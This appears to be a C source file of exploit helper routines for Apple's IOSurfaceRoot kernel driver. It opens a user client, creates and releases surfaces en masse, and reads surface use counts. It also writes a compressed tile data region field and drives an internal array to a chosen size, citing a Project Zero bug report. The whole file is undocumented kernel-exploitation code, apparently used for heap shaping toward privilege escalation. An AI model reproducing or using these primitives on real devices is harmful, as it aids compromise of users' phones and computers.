#include "IOSurfaceRoot.h"

io_connect_t IOSurfaceRoot_init(void)
{
    kern_return_t IOMasterPort(mach_port_t, mach_port_t *);
    mach_port_t mp = MACH_PORT_NULL;
    IOMasterPort(MACH_PORT_NULL, &mp);
    io_connect_t uc;

    io_service_t s = IOServiceGetMatchingService(mp, IOServiceMatching("IOSurfaceRoot"));
    if (s == MACH_PORT_NULL)
    {
        return 0;
    }
    
    if (IOServiceOpen(s, mach_task_self(), 0, &uc) != KERN_SUCCESS)
    {
        return 0;
    }
    
    return uc;
}

void IOSurfaceRoot_exit(io_connect_t uc)
{
    IOServiceClose(uc);
}

uint32_t IOSurfaceRoot_create_surface_fast(io_connect_t uc)
{
    // Brandon Azad's definitions from https://bugs.chromium.org/p/project-zero/issues/detail?id=1986#c4
    struct _IOSurfaceFastCreateArgs {
        uint64_t address;
        uint32_t width;
        uint32_t height;
        uint32_t pixel_format;
        uint32_t bytes_per_element;
        uint32_t bytes_per_row;
        uint32_t alloc_size;
    };

    struct IOSurfaceLockResult {
        uint8_t _pad1[0x18];
        uint32_t surface_id;
        uint8_t _pad2[0xF60-0x18-0x4];
    };
    
    struct _IOSurfaceFastCreateArgs create_args = { .alloc_size = (uint32_t) 0x4000 };
    struct IOSurfaceLockResult lock_result = {0};
    uint64_t lock_result_size = sizeof(lock_result);
    
    IOConnectCallMethod(
            uc,
            6,
            NULL, 0,
            &create_args, sizeof(create_args),
            NULL, NULL,
            &lock_result, (size_t *)&lock_result_size);
    
    return lock_result.surface_id;
}

kern_return_t IOSurfaceRoot_lookup_surface(io_connect_t uc, uint32_t surf_id)
{
    uint64_t sz = 0xF60;
    uint8_t o[0xF60];
    uint64_t scalarInput = surf_id;
    kern_return_t ret = IOConnectCallMethod(uc, 4, &scalarInput, 1, 0, 0, 0, 0, o, (size_t *)&sz);
    return ret;
}

kern_return_t IOSurfaceRoot_release_surface(io_connect_t uc, uint32_t surf_id)
{
    uint64_t scalarInput = surf_id;
    kern_return_t ret = IOConnectCallMethod(uc, 1, &scalarInput, 1, 0, 0, 0, 0, 0, 0);
    return ret;
}

void IOSurfaceRoot_release_all(io_connect_t uc)
{
    for (uint32_t surf_id = 1; surf_id < 0x3FFF; ++surf_id)
    {
        IOSurfaceRoot_release_surface(uc, surf_id);
    }
}

uint32_t IOSurfaceRoot_get_surface_use_count(io_connect_t uc, uint32_t surf_id)
{
    uint64_t scalarInput = surf_id;
    uint64_t output = 0;
    uint64_t outputCnt = 1;
    IOConnectCallMethod(uc, 16, &scalarInput, 1, 0, 0, &output, (uint32_t *)&outputCnt, 0, 0);

    return (uint32_t)output;
}

void IOSurfaceRoot_set_compressed_tile_data_region_memory_used_of_plane(io_connect_t uc, uint32_t surf_id, uint64_t tile)
{
    uint64_t scalarInput[3];

    scalarInput[0] = surf_id;
    scalarInput[1] = 0;
    scalarInput[2] = tile;

    IOConnectCallScalarMethod(uc, 31, (uint64_t *)&scalarInput, 3, 0, 0);
}

uint32_t IOSurfaceRoot_cause_array_size_to_be_0x4000(void)
{
    for (int i = 0; i < 4; ++i)
    {
        io_connect_t uc = IOSurfaceRoot_init();
        for (int i = 0; i < 0xf00; ++i)
        {
            uint32_t last_id = IOSurfaceRoot_create_surface_fast(uc);
            if (0x3400 <= (last_id * sizeof(uint64_t)))
            {
                return last_id;
            }
        }
    }
    
    return -1;
}
